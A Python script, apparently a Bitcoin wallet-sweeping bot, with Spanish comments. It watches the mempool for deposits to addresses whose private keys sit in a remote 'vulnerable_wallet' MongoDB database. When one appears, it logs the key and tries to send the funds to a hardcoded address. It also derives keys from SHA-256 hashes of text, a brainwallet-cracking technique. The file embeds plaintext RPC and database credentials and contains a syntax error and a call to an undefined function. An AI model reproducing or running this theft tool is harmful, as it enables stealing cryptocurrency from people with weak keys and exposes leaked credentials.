import os
import hashlib
import requests
import json
from decimal import Decimal
from requests.auth import HTTPBasicAuth

import time
from bitcoinx import (
    private_key_to_public_key,
    pubkey_to_bitcoin_address,
    btcPrivatekeyHextoWIF,
)

from getz_input import (
    parseTx,
    getSignableTxn
)

from bit import Key
from bit.network import NetworkAPI

# RPC BTC
btcHost = '127.0.0.1'
auth = HTTPBasicAuth('anigametv', 'gotech2020')

from pymongo import MongoClient

# Configurar la conexión a MongoDB
client = MongoClient("mongodb://animeflv:Onyx01091995@onyx.i234.me:27017/")
db = client["admin"]  # Nombre de la base de datos
collection = db["vulnerable_wallet"]  # Nombre de la colección

# Crear un índice en el campo address para mejorar la eficiencia de las búsquedas
collection.create_index("address")

def buscar_wifMongoDB(address):
    """
    Busca el WIF correspondiente a una dirección en MongoDB.
    
    :param address: La dirección a buscar.
    :return: El WIF correspondiente a la dirección, o None si no se encuentra.
    """
    try:
        # Realizar la consulta buscando el address
        resultado = collection.find_one({"address": address}, {"_id": 0, "wif": 1})
        
        if resultado:
            return resultado["wif"]
        else:
            #print(f"Dirección {address} no encontrada.")
            return None

    except Exception as e:
        print(f"Error al buscar la dirección: {e}")
        return None


def agregar_contenido_txt(nombre_archivo, contenido):
    """
    Crea un archivo TXT si no existe y agrega contenido en una nueva línea.

    :param nombre_archivo: Nombre del archivo TXT (ej. "archivo.txt")
    :param contenido: Contenido a agregar al archivo
    """
    try:
        with open(nombre_archivo, 'a') as archivo:  # Modo 'a' para agregar contenido
            archivo.write(contenido + '\n')  # Agregar contenido con un salto de línea
    except Exception as e:
        print(f"Ocurrió un error al escribir en el archivo: {e}")


# Obtener Numero del Bloque
def get_latest_block_number():
    data = {
        "method": "getblockcount",
        "params": [],
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()  # Raises an error for 4xx/5xx status codes
        result = response.json().get('result')
        return result
    except requests.exceptions.RequestException as e:
        return False



# Obtener el Fee de la Red
def get_highest_fee():
    # Establecemos el número de bloques para la estimación
    conf_target = 1  # Queremos una confirmación en 1 bloque
    estimate_mode = "CONSERVATIVE"  # Modo conservador para una estimación más segura

    data = {
        "method": "estimatesmartfee",
        "params": [conf_target, estimate_mode],  # Estimación para 1 bloque
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()  # Raises an error for 4xx/5xx status codes
        result = response.json().get('result')
        if result and 'feerate' in result:
            fee_in_btc_per_kb = result['feerate']  # Tarifa estimada en BTC por kB
            fee_in_satoshis_per_kb = fee_in_btc_per_kb * 100_000_000  # Convertir a satoshis por kB
            fee_in_satoshis_per_byte = fee_in_satoshis_per_kb / 1000  # Convertir a satoshis por byte
            return fee_in_satoshis_per_byte  # Retorna la tarifa estimada en satoshis por byte
        else:
            print("No se pudo obtener la estimación de la tarifa.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error al obtener la tarifa estimada: {e}")
        return None




# Obtener Informacion del Bloque por el hash pasando el numero
def obtener_info_bloque(block_number):
    
    # Obtener el hash del bloque usando el número del bloque
    data = {
        "method": "getblockhash",
        "params": [block_number],
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        block_hash = response.json().get('result')
        
        # Obtener la información del bloque usando el hash del bloque
        data = {
            "method": "getblock",
            "params": [block_hash],
            "id": 1
        }
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        block_info = response.json().get('result')

        # Extraer hash del bloque y array de transacciones
        block_hash = block_info.get('hash')
        tx_array = block_info.get('tx')
        getmerkleroot = block_info.get('merkleroot')
        
        return block_hash, tx_array, getmerkleroot

    except requests.exceptions.RequestException as e:
        return None, [], None


# Obtener todas las direcciones del tx que son direcciones que estan recibiendo fondos
def get_transaction_addresses(txid=None, mode="vout"):
    """
    Obtiene las direcciones de una transacción en función del modo: entradas (vin) o salidas (vout).

    :param txid: ID de la transacción (txid)
    :param mode: "vin" para direcciones que envían, "vout" para direcciones que reciben
    :return: Lista de direcciones y cantidades en función del modo seleccionado
    """
    if not txid:
        return {"error": "Debe proporcionar un txid válido."}

    data = {
        "method": "getrawtransaction",
        "params": [txid, True],  # Solicitar transacción decodificada
        "id": 1
    }

    try:
        # Realizar la solicitud al servidor Bitcoin (puedes cambiar 'btcHost' y 'auth' según corresponda)
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        transaction_info = response.json().get('result')

        # Si no se encuentra la información de la transacción, devolver una lista vacía
        if not transaction_info:
            return []

        if mode == "vout":
            # Procesar direcciones de salida (vout) y valores
            vout_addresses = []
            for vout in transaction_info.get('vout', []):
                address = vout.get('scriptPubKey', {}).get('address')  # Extraemos la dirección directamente de 'address'
                value = vout.get('value')  # Extraemos el valor de la transacción
                vout_index = vout.get('n')  # Extraemos el vout_index
                if address and value and vout_index is not None:
                    # Convertimos el valor a flotante y lo redondeamos a 8 decimales
                    formatted_value = round(value, 8)
                    vout_addresses.append({"address": address, "value": formatted_value, "vout_index": vout_index})


            return vout_addresses

        else:
            return []

    except requests.exceptions.RequestException as e:
        return []


# Obtener las transacciones pendiente que aun no esta en los bloque
def get_mempool_transactions():
    data = {
        "method": "getrawmempool",
        "params": [],  # Sin parámetros adicionales
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()  # Verifica si la solicitud tuvo éxito
        result = response.json().get('result')
        return result  # Esto será una lista de IDs de transacciones pendientes
    except requests.exceptions.RequestException as e:
        print(f"Error fetching mempool transactions: {e}")
        return False


# Función para enviar todos los fondos
def send_all_funds(privateKeyWIF, destination_address):
    # Crear una clave a partir de la clave privada en formato WIF
    key = Key(privateKeyWIF)

    # Definir el fee normal en satoshis por byte
    normal_fee = get_highest_fee()  # Obtener el Fee en Satoshi por byte

    fee_increment = 1  # Incremento del fee en satoshis por byte (aumenta 1 satoshi por cada transacción)
    current_fee = normal_fee  # Iniciar con el fee normal en satoshis

    try:

        # Generar la transacción sin especificar cantidad, solo dejando que el saldo restante se envíe a la dirección de destino
        tx = key.create_transaction([], leftover=destination_address, replace_by_fee=True, absolute_fee=True, fee=current_fee)

        # Enviar la transacción
        tx_id = key.send_transaction(tx)

        # Verificar que la transacción fue exitosa
        if tx_id:
            print(f"Transacción creada con éxito: {tx_id} : Fee: {current_fee}")

        else:
            print("No se pudo crear la transacción, sin detalles de la respuesta.")

    except Exception as e:
        print(f"Error al crear la transacción: {str(e)}")


# Funcion para enviar los fondos que aun esta pendiente de confirmacion, asi creamos una transaccion de retiro
def create_withdrawal_from_pending(privateKeyWIF, destination_address):
    """
    Crea y envía una transacción de retiro utilizando todos los fondos disponibles, incluyendo los UTXOs pendientes en la mempool.
    
    :param privateKeyWIF: Clave privada en formato WIF.
    :param destination_address: Dirección de destino para enviar los fondos.
    :return: Hash de la transacción enviada o mensaje de error.
    """
    try:

        # Crear la clave privada
        key = Key(privateKeyWIF)

        # Obtener el balance total, incluyendo los fondos pendientes de la mempool
        total_balance = key.get_balance('btc')  # Balance total en btc

        if total_balance <= 0:
            print("No hay fondos suficientes para realizar la transacción.")
            return None

        # Obtener todos los UTXOs disponibles (confirmados y pendientes)
        unspents = key.get_unspents()  # Obtener todos los UTXOs disponibles

        # Crear la transacción de retiro con todos los fondos disponibles
        tx = key.create_transaction(
            [(destination_address, float(total_balance), 'btc')],  # Usamos todos los fondos disponibles
            unspent=unspents,  # Usamos todos los UTXOs disponibles
            replace_by_fee=True  # Usamos RBF (Replace-by-Fee) si es necesario
        )

        # Enviar la transacción
        tx_hash = NetworkAPI.broadcast_tx(tx)

        print(f"Transacción enviada con éxito. Hash: {tx_hash}")
        return tx_hash

    except Exception as e:
        print(f"Error al crear o enviar la transacción: {str(e)}")
        return None



# Función para generar direcciones y WIF
def generar_direcciones_y_wif(texto=None, isAddress=False):
    """
    Genera las direcciones Bitcoin (comprimida y sin comprimir) y sus WIFs a partir de un texto.

    :param texto: Cadena de texto base para generar el hash SHA-256.
    :param isAddress: Si es True, se genera una dirección; si es False, se genera una clave privada.
    :return: Diccionario con las direcciones y WIFs.
    """

    if texto is None:
        return False  # Si texto es None, devolvemos False

    if isAddress:
        # Generar el hash SHA-256 del texto
        hex_generate = hashlib.sha256(texto.encode()).hexdigest()
    else:
        # Usar el texto tal cual si isAddress es False
        hex_generate = texto


    # Convertir Hex a WIF (comprimida y sin comprimir)
    pk_wif_sin_comprimir, pk_wif_comprimida = btcPrivatekeyHextoWIF(hex_generate)
    
    # PrivateKey HEX to Pubkey (comprimida y sin comprimir)
    pubkey_sin_comprimir, pubkey_comprimida = private_key_to_public_key(hex_generate)
    
    # PubKey to Address (comprimida y sin comprimir)
    address_sin_comprimir = pubkey_to_bitcoin_address(pubkey_sin_comprimir)
    address_comprimida = pubkey_to_bitcoin_address(pubkey_comprimida)
    
    # Devolver los resultados en un diccionario
    return {
        "hash_hex": hex_generate,
        "wif_sin_comprimir": pk_wif_sin_comprimir,
        "wif_comprimida": pk_wif_comprimida,
        "direccion_sin_comprimir": address_sin_comprimir,
        "direccion_comprimida": address_comprimida,
    }


# Función para procesar todas las transacciones pendiente de la mempool
def procesar_bloque_y_transacciones():

    # Obtener todas las transacciones pendientes en la mempool, solo la direccion (Para) la que esta recibiendo fondos
    tx_hashes = get_mempool_transactions()
    if tx_hashes is None:
        return

    # Contar el total de transacciones en la lista
    total_transactions = len(tx_hashes)

    # Obtenemos las direcciones de las transacciones y les asignamos los WIFs, buscamos la direcciones de cada tx y asi buscamos en mongodb si existe la direccion entonces retiramos
    for i, tx_hash in enumerate(tx_hashes):

        # Muestra el progreso en la misma línea
        print(f"[Procesando] {i}/{total_transactions} Tx", end="\r")

        # del Txid sacamos las direcciones que estan recibiendo fondos (para)
        tx_direcciones = get_transaction_addresses(tx_hash)
        for addr_info in tx_direcciones:

            # Aseguramos que la información tenga ambos valores (dirección y valor)
            if addr_info and 'address' in addr_info and 'value' in addr_info:

                address = addr_info['address']
                btcRecibido = addr_info['value'] # Cantidad de Bitcoin Recibido
                getVoutIndex = addr_info['vout_index'] # Vout_index del deposito

                # Verificamos que no este vacio, esto devuelve la direccion que tiene los tx y que la direccion comienze con 1
                if address and address.startswith('1'): 

                    print(f"[Buscando MONGODB] {address} :: BTC Recibido: {btcRecibido} [Vout Index {btcRecibido}] :: Txid: {tx_hash}") 

                    # Buscar en MongoDB, si existe retiramos saldo
                    searchMongoDBWIF = buscar_wifMongoDB(address)
                    if searchMongoDBWIF:

                        print(f"[Nueva Transaccion] {address} :: {searchMongoDBWIF}")

                        # Guardar la Wallet que se encontro con actividad reciente
                        agregar_contenido_txt('ENCONTRADA_actividadBTC.txt', f"{address} :: {searchMongoDBWIF}")

                        # realizar Retiro usando el txid del deposito que esta pendiente en la mempool
                        create_withdrawal_from_pending_tx(searchMongoDBWIF, 'bc1q8t4v5k00njd494u6l96qd8n3rkqxdzfncgr6u3', btcRecibido, tx_hash, getVoutIndex):


        # Sleep a Cada Transaccion que se envia peticion
        #time.sleep(0.001)


while True:

    # EJECUTAR PARA OBTENER TODAS LAS TRANSACCIONES PENDIENTE DE LA MEMPOOL
    procesar_bloque_y_transacciones()

    # Esperamos 5 Segundos luego de procesar todas las transacciones pendiente de la mempool
    time.sleep(5)